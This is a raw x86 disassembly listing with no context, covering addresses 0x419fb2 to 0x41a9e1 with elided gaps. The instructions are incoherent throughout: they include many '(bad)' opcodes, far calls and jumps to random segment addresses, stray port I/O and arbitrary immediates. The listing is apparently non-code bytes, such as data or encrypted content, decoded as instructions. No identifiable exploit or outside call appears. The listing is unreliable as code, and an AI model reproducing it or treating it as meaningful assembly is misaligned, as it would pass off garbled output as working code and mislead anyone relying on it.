  419fb2:	sbb    bl,BYTE PTR [edi]
  419fb4:	cmp    ch,BYTE PTR fs:[ebp+ebx*4-0x3f]
  419fb9:	call   0x345e:0x12b029f8
  419fc0:	out    0xa,al
  419fc2:	cmp    dl,BYTE PTR [ebx]
  419fc4:	je     0x419f62
  419fc6:	inc    esp
  419fc7:	inc    edi
  419fc8:	pop    eax
  419fc9:	les    ebp,FWORD PTR [ecx+0x6a]
  419fcc:	jmp    0x95bb:0x87711d5e
  419fd3:	fs mov ebx,0x759cb02b
  419fd9:	in     eax,0x20
  419fdb:	(bad)  
  419fdc:	xlat   BYTE PTR ds:[ebx]
  419fdd:	dec    edx
  419fde:	push   ss
  419fdf:	jo     0x419fe9
  419fe1:	clc    
  419fe2:	inc    ebx
  419fe3:	nop
  419fe4:	mov    al,0x1d
  419fe6:	pop    ecx
  419fe7:	sub    DWORD PTR [ebx],0x6c0c0f7f
  419fed:	push   edi
  419fee:	cmp    ch,cl
  419ff0:	add    eax,0x6f0612df
  419ff5:	push   ebp
  419ff6:	call   0x372e:0x67c2cc0c
  419ffd:	(bad)  
  419ffe:	in     al,dx
  419fff:	jne    0x419ffc
  41a001:	and    DWORD PTR [eax],0x992a3bda
  41a007:	lahf   
  41a008:	les    edi,FWORD PTR [ebx-0xc68c63a]
  41a00e:	adc    esi,DWORD PTR [eax-0x5c369410]
  41a014:	and    BYTE PTR [eax+0x47b828c7],0xca
  41a01b:	mov    ch,0xf0
  41a01d:	push   cs
  41a01e:	inc    esi
  41a01f:	je     0x419fa1
  41a021:	jbe    0x419fd8
  41a023:	dec    edx
  41a024:	sbb    DWORD PTR [edx+0x716f6e86],esi
  41a02a:	jg     0x41a057
  41a02c:	or     al,0xce
  41a02e:	dec    ebp
  41a02f:	test   al,0xac
  41a031:	push   0x6c9de1c
  41a036:	sbb    edx,esi
  41a038:	xchg   ebx,eax
  41a039:	mov    DWORD PTR [ebp-0x9dde1e3],edx
  41a03f:	mov    ah,0xbd
  41a041:	cwde   
  41a042:	cmp    ch,BYTE PTR ds:0xaa79ca2
  41a048:	pop    ds
  41a049:	fistp  WORD PTR [edi+0x2d]
  41a04c:	xor    al,0xf9
  41a04e:	(bad)  
  41a04f:	jge    0x41a0b8
  41a051:	repnz fiadd WORD PTR [ecx-0x49]
  41a055:	mov    ds:0xbadfeb8,al
  41a05a:	add    esi,esi
  41a05c:	ret    
  41a05d:	aam    0x6d
  41a05f:	mov    DWORD PTR [ecx-0x31],eax
  41a062:	mov    BYTE PTR [ebx-0x6f],0x7
  41a066:	ss out 0x94,al
  41a069:	and    eax,0xd40b08
	...
  41a0d6:	dec    esi
  41a0d7:	jmp    0x41a103
  41a0d9:	dec    esi
  41a0da:	scas   eax,DWORD PTR es:[edi]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax-0x70],bh
  41a0e3:	xchg   esp,eax
  41a0e4:	(bad)
  41a0e8:	add    DWORD PTR [eax],eax
  41a0ea:	inc    DWORD PTR [eax]
  41a0ec:	add    BYTE PTR [eax],al
  41a0ee:	aad    0xc7
  41a0f0:	push   0xffffffc6
  41a0f2:	xchg   esi,eax
  41a0f3:	xor    BYTE PTR ds:[edi+0x730380f3],dl
  41a0fa:	pop    ebp
  41a0fb:	scas   eax,DWORD PTR es:[edi]
  41a0fc:	ss (bad) 
  41a0ff:	mov    ch,0xe6
  41a101:	std    
  41a102:	out    0x8b,al
  41a104:	pop    es
  41a105:	sbb    dh,ch
  41a107:	fistp  QWORD PTR [ecx-0x684e3f]
  41a10d:	mov    al,ds:0xf4447a27
  41a112:	loop   0x41a0f2
  41a114:	out    0xaa,al
  41a116:	push   ss
  41a117:	cwde   
  41a118:	mov    al,0x36
  41a11a:	mov    ecx,0x3547a0cf
  41a11f:	sar    BYTE PTR [ebp+eax*2-0x38c203e3],0xad
  41a127:	push   edi
  41a128:	sbb    BYTE PTR [esi],bl
  41a12a:	out    0xcb,al
  41a12c:	int    0x27
  41a12e:	jecxz  0x41a0cb
  41a130:	aam    0x62
  41a132:	xor    DWORD PTR fs:[ebx-0x2d],esp
  41a136:	in     al,0xcf
  41a138:	(bad)  [eax+0x7a]
  41a13b:	push   eax
  41a13c:	add    eax,0x343fe1f7
  41a141:	cs xchg edi,eax
  41a143:	cmp    ah,al
  41a145:	and    BYTE PTR [ebp-0x210a14a0],al
  41a14b:	mov    ebx,0x331c5ff
  41a150:	and    eax,0x9956d306
  41a155:	aaa    
  41a156:	popf   
  41a157:	pop    esi
  41a158:	xor    DWORD PTR [esi+0x5a01f9b3],edx
  41a15e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a15f:	aam    0x2
  41a161:	stos   DWORD PTR es:[edi],eax
  41a162:	and    eax,DWORD PTR ds:0x18046b2
  41a168:	int3   
  41a169:	or     eax,0x54ffcc9f
  41a16e:	arpl   cx,dx
  41a170:	scas   al,BYTE PTR es:[edi]
  41a171:	adc    edx,DWORD PTR [ebp-0x7048a3c8]
  41a177:	lods   al,BYTE PTR ds:[esi]
  41a178:	dec    ecx
  41a179:	jae    0x41a182
  41a17b:	and    bh,BYTE PTR [ebx-0x4b6828e5]
  41a181:	icebp  
  41a182:	adc    DWORD PTR [esi],edx
  41a184:	ret    0x6f41
  41a187:	loope  0x41a140
  41a189:	mov    bh,al
  41a18b:	ret    
  41a18c:	xchg   BYTE PTR [ecx+0x7cec8f09],cl
  41a192:	cs jnp 0x41a211
  41a195:	xor    dh,BYTE PTR [edi-0x6f17deea]
  41a19b:	fisubr WORD PTR ds:0x267f4899
  41a1a1:	icebp  
  41a1a2:	fadd   QWORD PTR [eax+0x310704b6]
  41a1a8:	out    dx,al
  41a1a9:	push   esi
  41a1aa:	push   edx
  41a1ab:	mov    al,0x0
  41a1ad:	xchg   edx,eax
  41a1ae:	mov    esp,DWORD PTR [esi+ebp*4-0x2b1e452d]
  41a1b5:	fiadd  DWORD PTR [ebp-0x4b9029ca]
  41a1bb:	add    ebx,ebx
  41a1bd:	loope  0x41a1bc
  41a1bf:	sbb    bh,al
  41a1c1:	outs   dx,BYTE PTR ds:[esi]
  41a1c2:	sbb    ch,al
  41a1c4:	push   esi
  41a1c5:	mov    ch,0x3e
  41a1c7:	pop    ebp
  41a1c8:	or     DWORD PTR [ebp+0x1a],ebx
  41a1cb:	cwde   
  41a1cc:	mov    dl,0x5f
  41a1cf:	test   BYTE PTR cs:[eax+0x7a],ch
  41a1d3:	aas    
  41a1d4:	lods   al,BYTE PTR ds:[esi]
  41a1d5:	jo     0x41a219
  41a1d7:	or     bh,BYTE PTR [ebx+0x3e76a4e1]
  41a1dd:	push   edx
  41a1de:	inc    edi
  41a1df:	daa    
  41a1e0:	mov    ecx,ebx
  41a1e2:	js     0x41a25e
  41a1e4:	add    DWORD PTR [esi+ebx*2-0x7c],edi
  41a1e8:	add    al,BYTE PTR [edx]
  41a1ea:	jp     0x41a268
  41a1ec:	les    eax,FWORD PTR [eax]
	...
  41a256:	sbb    al,0xc
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	dec    edx
  41a263:	cld    
  41a264:	test   DWORD PTR [esi+0x11925],esp
  41a26a:	inc    DWORD PTR [eax]
  41a26c:	add    BYTE PTR [eax],al
  41a26e:	bound  edx,QWORD PTR [ebp+0x3f77f457]
  41a274:	stos   BYTE PTR es:[edi],al
  41a275:	imul   esi,DWORD PTR [ecx+0x50],0xffffffe3
  41a279:	jecxz  0x41a28c
  41a27b:	and    DWORD PTR [edx+ebp*4],esp
  41a27e:	inc    esi
  41a27f:	lods   al,BYTE PTR ds:[esi]
  41a280:	mov    edx,0x81dfc2eb
  41a285:	dec    eax
  41a286:	outs   dx,BYTE PTR ds:[esi]
  41a287:	mov    bl,0x42
  41a289:	fisub  WORD PTR [edi+0x43]
  41a28c:	mov    es,ecx
  41a28e:	lahf   
  41a28f:	inc    ebp
  41a290:	mov    ss,ecx
  41a292:	div    BYTE PTR [edx]
  41a294:	mov    edi,es
  41a296:	std    
  41a297:	sbb    eax,0xec649b9b
  41a29c:	pop    edi
  41a29d:	inc    eax
  41a29e:	(bad)  
  41a29f:	iret   
  41a2a0:	adc    eax,0x16
  41a2a3:	(bad)  
  41a2a4:	push   0xffffffc1
  41a2a6:	stos   DWORD PTR es:[edi],eax
  41a2a7:	shl    BYTE PTR [eax],1
  41a2a9:	outs   dx,BYTE PTR ds:[esi]
  41a2aa:	jg     0x41a2b4
  41a2ac:	dec    esp
  41a2ad:	pmuludq mm5,QWORD PTR [ecx-0x22]
  41a2b1:	or     DWORD PTR [esi+0x6e],ebp
  41a2b4:	sar    DWORD PTR [edx+0xe56d061],1
  41a2ba:	out    dx,al
  41a2bb:	scas   eax,DWORD PTR es:[edi]
  41a2bc:	loopne 0x41a2cd
  41a2be:	xchg   edi,eax
  41a2bf:	jecxz  0x41a2bf
  41a2c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2c2:	add    DWORD PTR [ebx-0x3a],0xfffffff8
  41a2c6:	pop    ebx
  41a2c7:	xor    esi,esp
  41a2c9:	outs   dx,BYTE PTR ds:[esi]
  41a2ca:	push   ebx
  41a2cb:	or     al,0xb3
  41a2cd:	mov    ah,0x47
  41a2cf:	jno    0x41a271
  41a2d1:	push   0x9bec57de
  41a2d6:	imul   BYTE PTR [ecx+0x21]
  41a2d9:	sub    eax,0xbd9be4d2
  41a2de:	inc    esi
  41a2df:	int3   
  41a2e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2e1:	(bad)  
  41a2e2:	xchg   ebx,eax
  41a2e3:	lods   al,BYTE PTR ds:[esi]
  41a2e4:	call   0xeb8794e5
  41a2e9:	imul   esi,DWORD PTR [edi],0xffffffa3
  41a2ec:	dec    ebx
  41a2ed:	dec    esp
  41a2ee:	mov    ch,al
  41a2f0:	jmp    0x24d5e198
  41a2f5:	sti    
  41a2f6:	iret   
  41a2f7:	mov    ebp,0x88f2052b
  41a2fc:	jbe    0x41a374
  41a2fe:	cmp    edx,DWORD PTR [ebx]
  41a300:	pop    esp
  41a301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a302:	jns    0x41a289
  41a304:	(bad)  
  41a305:	pop    eax
  41a306:	inc    ebx
  41a307:	sub    eax,0xb4f3b438
  41a30c:	or     al,0xb1
  41a30e:	in     eax,dx
  41a30f:	push   esp
  41a310:	xchg   edx,eax
  41a311:	jge    0x41a2b4
  41a313:	mov    cl,0x80
  41a315:	popf   
  41a316:	cld    
  41a317:	js     0x41a2ef
  41a319:	test   al,0x1a
  41a31b:	mov    bh,0xe1
  41a31d:	mov    ebp,0xb2373377
  41a322:	dec    ecx
  41a323:	mov    bl,0x6f
  41a325:	ss dec ebp
  41a327:	cs cmp eax,0x6e8d86a2
  41a32d:	repnz arpl WORD PTR [edi],ax
  41a330:	xor    DWORD PTR [esi],0xfffffff6
  41a333:	shr    DWORD PTR [eax-0x5b072ded],1
  41a339:	cs enter 0xa7d9,0x20
  41a33e:	int    0xb2
  41a340:	je     0x41a2ff
  41a342:	les    eax,FWORD PTR [ecx]
  41a344:	mov    eax,0x1214a054
  41a349:	in     al,0x91
  41a34b:	(bad)  
  41a34c:	and    DWORD PTR [edx+0x71],esi
  41a34f:	lds    ecx,FWORD PTR [ebp+esi*1-0x40ab314e]
  41a356:	mov    ds:0x4f66e544,al
  41a35b:	leave  
  41a35c:	xchg   edx,eax
  41a35d:	je     0x41a342
  41a35f:	mov    dl,0xf1
  41a361:	das    
  41a362:	sti    
  41a363:	sbb    BYTE PTR [esi+eax*2-0x6e],ah
  41a367:	xchg   ebp,eax
  41a368:	retf   0xdcfe
  41a36b:	sub    eax,0x5a
	...
  41a3d4:	add    BYTE PTR [eax],al
  41a3d6:	neg    DWORD PTR [eax-0x58]
  41a3d9:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a3df:	pop    esp
  41a3e0:	xchg   ebp,eax
  41a3e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e2:	loopne 0x41a462
  41a3e4:	jae    0x41a45a
  41a3e6:	and    al,0x1a
  41a3e8:	add    DWORD PTR [eax],eax
  41a3ea:	inc    DWORD PTR [eax]
  41a3ec:	add    BYTE PTR [eax],al
  41a3ee:	sahf   
  41a3ef:	daa    
  41a3f0:	iret   
  41a3f1:	jle    0x41a46c
  41a3f3:	imul   esi,edx,0xcdf975c2
  41a3f9:	mov    eax,0x81d74a33
  41a3fe:	push   edi
  41a3ff:	je     0x41a3bd
  41a401:	xchg   esp,ebp
  41a403:	loop   0x41a444
  41a405:	loope  0x41a3e9
  41a407:	gs pop ecx
  41a409:	ret    
  41a40a:	pop    esi
  41a40b:	int    0x50
  41a40d:	push   ecx
  41a40e:	test   DWORD PTR [esi+edx*8],ebp
  41a411:	dec    ecx
  41a412:	shl    BYTE PTR [esi],0xaa
  41a415:	mov    dh,0x7a
  41a417:	test   eax,0x44bc807d
  41a41c:	or     eax,0x3ed97d09
  41a421:	jb     0x41a411
  41a423:	jno    0x41a404
  41a425:	into   
  41a426:	or     eax,0x48ae65cf
  41a42b:	cmp    BYTE PTR [esi+0x3fcafde4],al
  41a431:	inc    BYTE PTR [esi+esi*2]
  41a434:	ins    DWORD PTR es:[edi],dx
  41a435:	(bad)  
  41a436:	in     eax,dx
  41a437:	enter  0xb9f1,0xe5
  41a43b:	stos   DWORD PTR es:[edi],eax
  41a43c:	lahf   
  41a43d:	sbb    DWORD PTR [edx+0x771525b],esi
  41a443:	xchg   ebp,eax
  41a444:	sbb    eax,0x4a609dd8
  41a449:	inc    esp
  41a44a:	mov    eax,ds:0xe5a1c3ae
  41a44f:	or     eax,0xcb281a17
  41a454:	fcmovbe st,st(3)
  41a456:	xchg   edi,eax
  41a457:	in     eax,0x4a
  41a459:	sbb    BYTE PTR [esp+ebp*1],ah
  41a45c:	pop    ecx
  41a45d:	jle    0x41a434
  41a45f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a460:	xchg   ecx,eax
  41a461:	in     eax,dx
  41a462:	call   0xce43:0xbe98dac6
  41a469:	inc    esp
  41a46a:	outs   dx,DWORD PTR ds:[esi]
  41a46b:	xchg   ebx,eax
  41a46c:	push   ebp
  41a46d:	ins    DWORD PTR es:[edi],dx
  41a46e:	or     esp,DWORD PTR [edx+0x2e952ebb]
  41a474:	push   cs
  41a475:	ja     0x41a420
  41a477:	daa    
  41a478:	fwait
  41a479:	out    dx,al
  41a47a:	lods   eax,DWORD PTR ds:[esi]
  41a47b:	sub    eax,0xef5da332
  41a480:	sbb    eax,0xb61cc9a1
  41a485:	sbb    ch,BYTE PTR [ebx-0xa]
  41a488:	inc    eax
  41a489:	test   BYTE PTR [esi-0x39],al
  41a48c:	sbb    ch,BYTE PTR [ebp+0x5c9c9d9b]
  41a492:	xor    al,0xc9
  41a494:	dec    esi
  41a495:	in     al,dx
  41a496:	add    dl,BYTE PTR [esi]
  41a498:	shr    DWORD PTR [ebp+eax*4-0x7144cd22],cl
  41a49f:	scas   al,BYTE PTR es:[edi]
  41a4a0:	scas   eax,DWORD PTR es:[edi]
  41a4a1:	xor    ecx,DWORD PTR gs:[ecx]
  41a4a4:	daa    
  41a4a5:	dec    edx
  41a4a6:	xchg   ebx,eax
  41a4a7:	jmp    0x41a509
  41a4a9:	loope  0x41a4d1
  41a4ab:	cmp    eax,0xcecb3172
  41a4b0:	and    al,0xe0
  41a4b2:	call   FWORD PTR [eax-0x41]
  41a4b5:	mov    dh,0x78
  41a4b7:	jp     0x41a465
  41a4b9:	inc    ecx
  41a4ba:	jmp    0xd6cffc27
  41a4bf:	mov    ds:0x279c4ee0,al
  41a4c4:	idiv   bh
  41a4c6:	sbb    ebx,DWORD PTR [ecx+0x7fdacfa1]
  41a4cc:	jg     0x41a48b
  41a4ce:	and    esp,DWORD PTR [edi-0x34b75279]
  41a4d4:	pop    es
  41a4d5:	mov    al,0xa6
  41a4d7:	cmc    
  41a4d8:	(bad)  
  41a4d9:	outs   dx,BYTE PTR ds:[esi]
  41a4da:	xchg   esp,eax
  41a4db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4dc:	sub    ch,0xa2
  41a4df:	pushf  
  41a4e0:	das    
  41a4e1:	es leave 
  41a4e3:	in     al,dx
  41a4e4:	loope  0x41a506
  41a4e6:	jne    0x41a4c4
  41a4e8:	pop    esp
  41a4e9:	shl    DWORD PTR [ebx+esi*2+0x8],1
	...
  41a555:	add    BYTE PTR [edi-0xf0307e],bh
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	outs   dx,BYTE PTR ds:[esi]
  41a563:	mov    cl,0x48
  41a565:	xchg   BYTE PTR [ebx],ah
  41a567:	sbb    eax,DWORD PTR [ecx]
  41a569:	add    bh,bh
  41a56b:	add    BYTE PTR [eax],al
  41a56d:	add    BYTE PTR [ecx-0x10],ch
  41a570:	stos   DWORD PTR es:[edi],eax
  41a571:	mov    esp,0x9b57dc70
  41a576:	fdivr  DWORD PTR [eax+ecx*1+0x60]
  41a57a:	pusha  
  41a57b:	push   ds
  41a57c:	stos   BYTE PTR es:[edi],al
  41a57d:	mov    eax,ds:0xb4d3d61c
  41a582:	push   ds
  41a583:	inc    ebp
  41a584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a585:	cmp    ch,bl
  41a587:	es ret 0x6557
  41a58b:	or     al,0x5b
  41a58d:	sbb    eax,0x41b12869
  41a592:	jne    0x41a539
  41a594:	aam    0x30
  41a596:	scas   al,BYTE PTR es:[edi]
  41a597:	or     ebp,DWORD PTR [ecx+0x7c]
  41a59a:	hlt    
  41a59b:	mov    ah,0x23
  41a59d:	xchg   esp,eax
  41a59e:	and    BYTE PTR [edx+0x6e6ed018],bl
  41a5a4:	or     BYTE PTR [ebx],dh
  41a5a6:	add    eax,0xb8f8c507
  41a5ab:	aaa    
  41a5ac:	jo     0x41a62d
  41a5ae:	cli    
  41a5af:	lds    esp,FWORD PTR [ecx]
  41a5b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5b2:	test   eax,0x7d9a934f
  41a5b7:	(bad)  
  41a5b8:	mov    ebx,0x5400c858
  41a5bd:	adc    DWORD PTR [ebp+ebp*1-0x7f],ecx
  41a5c1:	mov    al,ds:0x89735e7c
  41a5c6:	out    0xbb,al
  41a5c8:	aaa    
  41a5c9:	(bad)  [esi+0x4138c6a]
  41a5cf:	leave  
  41a5d0:	pushf  
  41a5d1:	add    eax,0xbaef9e1
  41a5d6:	test   ch,dl
  41a5d8:	(bad)  
  41a5d9:	shl    BYTE PTR [ecx+ebx*1-0x48],0x3b
  41a5de:	push   0xffffffbb
  41a5e0:	fisttp WORD PTR [eax-0x51cf5d93]
  41a5e6:	icebp  
  41a5e7:	call   0x2ac1:0xba768a2
  41a5ee:	dec    edx
  41a5ef:	(bad)  
  41a5f0:	sub    eax,0x3e65f4f0
  41a5f5:	jno    0x41a5aa
  41a5f7:	int    0x4
  41a5f9:	jnp    0x41a620
  41a5fb:	(bad)  
  41a5fd:	cmp    DWORD PTR [edi],ebp
  41a5ff:	loop   0x41a5c8
  41a601:	and    bl,BYTE PTR [eax]
  41a603:	pop    edi
  41a604:	push   ebp
  41a605:	and    DWORD PTR [ebx+0x707a10a8],eax
  41a60b:	popa   
  41a60c:	shl    edx,1
  41a60e:	repz mov cl,0xdd
  41a611:	rol    bh,0x77
  41a614:	xchg   BYTE PTR [edi-0x40],dh
  41a617:	and    bl,bl
  41a619:	test   eax,0x45ba80cc
  41a61e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a61f:	inc    esi
  41a620:	shr    DWORD PTR [edx-0x15d2414d],1
  41a626:	mov    edi,0x617bf81f
  41a62b:	jmp    0xe59b:0x6f9ca225
  41a632:	cmp    BYTE PTR [ebp-0x25],dh
  41a635:	inc    ebx
  41a636:	jmp    DWORD PTR [eax-0x44]
  41a639:	mov    edx,0x8170cffc
  41a63e:	sbb    eax,DWORD PTR [ebx]
  41a640:	and    eax,0x99ca3663
  41a645:	js     0x41a657
  41a647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a648:	neg    DWORD PTR [ebx+0x52]
  41a64b:	dec    ebp
  41a64c:	loope  0x41a69b
  41a64e:	sub    al,0xf8
  41a650:	sbb    ch,ah
  41a652:	ja     0x41a65e
  41a654:	xchg   BYTE PTR [ecx-0x64],ch
  41a657:	jno    0x41a5dd
  41a659:	or     DWORD PTR [edx+0x66],edx
  41a65c:	pop    ss
  41a65d:	adc    eax,0xed82046a
  41a662:	rcr    BYTE PTR [eax+0x48218603],cl
  41a668:	pop    esp
  41a669:	js     0x41a5fc
  41a66b:	outs   dx,BYTE PTR ds:[esi]
  41a66c:	xchg   ebp,eax
	...
  41a6d5:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0xbcf3a625
  41a6e4:	or     eax,0x11c2280
  41a6e9:	add    bh,bh
  41a6eb:	add    BYTE PTR [eax],al
  41a6ed:	add    BYTE PTR [eax-0x77],al
  41a6f0:	int3   
  41a6f1:	retf   0x684a
  41a6f4:	scas   al,BYTE PTR es:[edi]
  41a6f5:	mov    eax,0x57abe25d
  41a6fa:	ds cmp al,0xdd
  41a6fd:	gs mov eax,0xcc7b7448
  41a703:	dec    esp
  41a704:	nop
  41a705:	lock cli 
  41a707:	outs   dx,DWORD PTR ds:[esi]
  41a708:	test   eax,0xfcb04d75
  41a70d:	jb     0x41a71f
  41a70f:	je     0x41a767
  41a711:	cli    
  41a712:	pop    es
  41a713:	stc    
  41a714:	js     0x41a774
  41a716:	in     eax,0x69
  41a718:	mov    ah,0xf5
  41a71a:	aam    0x35
  41a71c:	and    al,0x76
  41a71e:	cmp    eax,0x4f8d8390
  41a723:	sub    DWORD PTR [eax+0x4c],0x38
  41a727:	pop    esi
  41a728:	mov    esp,0x17261a5e
  41a72d:	or     esi,DWORD PTR [ebx+edi*8]
  41a730:	jbe    0x41a780
  41a732:	fld    QWORD PTR [edx]
  41a734:	inc    edi
  41a735:	rcl    DWORD PTR [ecx],cl
  41a737:	aaa    
  41a738:	cmp    eax,0xee3fea53
  41a73d:	pop    edi
  41a73e:	inc    esi
  41a73f:	test   dl,0xd9
  41a742:	cwde   
  41a743:	cmp    ah,BYTE PTR [eax-0x4979819e]
  41a749:	loope  0x41a75b
  41a74b:	bound  esp,QWORD PTR [ebp+0xb]
  41a74e:	and    al,0xd2
  41a750:	gs xchg ebp,eax
  41a752:	or     DWORD PTR [edx-0x24f9f5d4],edx
  41a758:	mov    al,ds:0xe4b190e0
  41a75d:	das    
  41a75e:	(bad)  
  41a760:	out    dx,eax
  41a761:	fucomip st,st(0)
  41a763:	push   edi
  41a764:	repz test al,0x5f
  41a767:	pop    edx
  41a768:	rol    DWORD PTR [esi-0x56],1
  41a76b:	faddp  st(4),st
  41a76d:	js     0x41a764
  41a76f:	nop
  41a770:	outs   dx,BYTE PTR ds:[esi]
  41a771:	inc    ebp
  41a772:	push   esi
  41a773:	loop   0x41a72c
  41a775:	fldcw  WORD PTR [ebp-0x68]
  41a778:	mov    eax,0x15430a2b
  41a77d:	mov    ds:0x415051a0,eax
  41a782:	retf   0x4893
  41a785:	push   ebx
  41a786:	ins    BYTE PTR es:[edi],dx
  41a787:	enter  0x2eff,0x75
  41a78b:	sti    
  41a78c:	add    DWORD PTR [ecx],0x44
  41a78f:	add    al,ch
  41a791:	sub    cl,cl
  41a793:	push   es
  41a794:	push   eax
  41a795:	test   eax,0xd8bb6798
  41a79a:	xor    edx,DWORD PTR [edx]
  41a79c:	cli    
  41a79d:	fdivr  DWORD PTR [ebp+0x2dff9aa0]
  41a7a3:	dec    esp
  41a7a4:	inc    edi
  41a7a5:	stos   BYTE PTR es:[edi],al
  41a7a6:	test   BYTE PTR [edx-0x42],dl
  41a7a9:	xor    BYTE PTR [edx-0x49],al
  41a7ac:	ins    BYTE PTR es:[edi],dx
  41a7ad:	xchg   ebx,eax
  41a7ae:	inc    esi
  41a7af:	scas   al,BYTE PTR es:[edi]
  41a7b0:	xor    al,0xdc
  41a7b2:	rol    BYTE PTR [edi-0x5b3ff2b1],1
  41a7b8:	je     0x41a73f
  41a7ba:	mov    ch,0x73
  41a7bc:	movlps QWORD PTR [edx+esi*4-0x1],xmm7
  41a7c1:	push   ds
  41a7c2:	cmp    ah,al
  41a7c4:	pop    edi
  41a7c5:	loop   0x41a7e2
  41a7c7:	push   cs
  41a7c8:	add    BYTE PTR [esi],bh
  41a7ca:	add    BYTE PTR [ecx+0x5883f30b],0x83
  41a7d1:	cmp    ch,ch
  41a7d3:	das    
  41a7d4:	rol    BYTE PTR [ecx-0x550f1e3a],1
  41a7da:	xor    BYTE PTR [esi+edi*4+0x7841f7a8],0x8c
  41a7e2:	or     DWORD PTR [ebx+0x38683f3e],ebp
  41a7e8:	xlat   BYTE PTR ds:[ebx]
  41a7e9:	out    0xb9,al
  41a7eb:	fxch   st(5)
	...
  41a855:	add    bl,dh
  41a857:	xchg   edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
  41a85c:	div    edi
  41a85e:	mov    ds:0x415327ca,al
  41a863:	mov    ah,0xd3
  41a865:	(bad)  
  41a866:	and    DWORD PTR ds:0xff0001,ebx
  41a86c:	add    BYTE PTR [eax],al
  41a86e:	(bad)  
  41a86f:	push   eax
  41a870:	pop    ebx
  41a871:	inc    BYTE PTR [edx+0x321bb98c]
  41a877:	xchg   ebx,eax
  41a878:	iret   
  41a879:	ds out 0xaa,al
  41a87c:	sub    eax,0x32f727ab
  41a881:	popf   
  41a882:	outs   dx,BYTE PTR ds:[esi]
  41a883:	dec    esi
  41a884:	mov    ebx,0x41360008
  41a889:	and    DWORD PTR [eax+0x72],0xf8a388f7
  41a890:	pop    edi
  41a891:	push   ss
  41a892:	push   ebp
  41a893:	jge    0x41a840
  41a895:	inc    esi
  41a896:	int    0x62
  41a898:	ror    eax,0xf6
  41a89b:	or     edx,DWORD PTR [esi-0x6f9fd35f]
  41a8a1:	mov    ebx,0x7b34a85c
  41a8a6:	push   edi
  41a8a7:	in     al,0x18
  41a8a9:	test   al,0x40
  41a8ab:	out    0x43,eax
  41a8ad:	bound  edi,QWORD PTR [edx-0x1d2ff42]
  41a8b3:	les    esp,FWORD PTR [edi+0x637de3cf]
  41a8b9:	cmp    BYTE PTR ds:0x852669e7,al
  41a8bf:	mov    edi,0x19155b6b
  41a8c4:	rcl    BYTE PTR [edx+0x1310780a],0xb3
  41a8cb:	out    0xf8,al
  41a8cd:	pop    edx
  41a8ce:	inc    esi
  41a8cf:	mov    edx,0x2019706d
  41a8d4:	aaa    
  41a8d5:	xor    dl,cl
  41a8d7:	jb     0x41a94a
  41a8d9:	jns    0x41a8e7
  41a8db:	pushf  
  41a8dc:	outs   dx,DWORD PTR ds:[esi]
  41a8dd:	jns    0x41a86d
  41a8df:	push   edx
  41a8e0:	rcl    BYTE PTR [ecx],0x4d
  41a8e3:	xor    DWORD PTR ds:0x2c56e4b0,edi
  41a8e9:	mov    WORD PTR [ebx-0x44],ds
  41a8ec:	push   esp
  41a8ed:	or     al,0xb1
  41a8ef:	shl    BYTE PTR [eax+0x7aec4992],0xf9
  41a8f6:	out    0x9b,eax
  41a8f8:	push   ss
  41a8f9:	ins    BYTE PTR es:[edi],dx
  41a8fa:	push   ss
  41a8fb:	(bad)  
  41a8fc:	aad    0x7e
  41a8fe:	mov    ebp,cs
  41a900:	cmc    
  41a901:	rcr    ch,1
  41a903:	xor    al,0x95
  41a905:	sub    al,0xf6
  41a907:	xor    al,0xe9
  41a909:	(bad)  
  41a90b:	or     dl,BYTE PTR [ebp-0x21]
  41a90e:	mov    ds:0x91499791,al
  41a913:	sbb    DWORD PTR [edi+0x31],0x76
  41a917:	cmp    al,0xf7
  41a919:	arpl   si,di
  41a91b:	and    eax,0x36b2a659
  41a920:	push   ecx
  41a921:	push   esp
  41a922:	das    
  41a923:	stos   BYTE PTR es:[edi],al
  41a924:	inc    ebx
  41a925:	or     BYTE PTR [edi],ah
  41a927:	dec    esp
  41a928:	mov    ecx,0xb3cfad2c
  41a92d:	dec    eax
  41a92e:	add    dl,cl
  41a930:	add    al,0x53
  41a932:	cwde   
  41a933:	sub    eax,0xb9f7a1a6
  41a938:	xor    BYTE PTR [ebp+0x4c],dl
  41a93b:	clc    
  41a93c:	and    al,0xee
  41a93e:	aam    0xc7
  41a940:	call   0xd9d3:0xaba1ffe2
  41a947:	xchg   ebp,eax
  41a948:	js     0x41a948
  41a94a:	sbb    al,ch
  41a94c:	fimul  WORD PTR [esi+0x9326f97]
  41a952:	push   ebx
  41a953:	test   eax,0x254ad313
  41a958:	cmc    
  41a959:	adc    BYTE PTR [esi+0x1e],ah
  41a95c:	and    al,0x1a
  41a95e:	out    0x88,al
  41a960:	fwait
  41a961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a962:	cmp    DWORD PTR [ebx-0x19926020],eax
  41a968:	xchg   BYTE PTR [edi],dl
  41a96a:	in     eax,0x71
  41a96c:	mov    ecx,0x0
	...
  41a9d5:	add    BYTE PTR ds:0xcf4a867e,dh
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
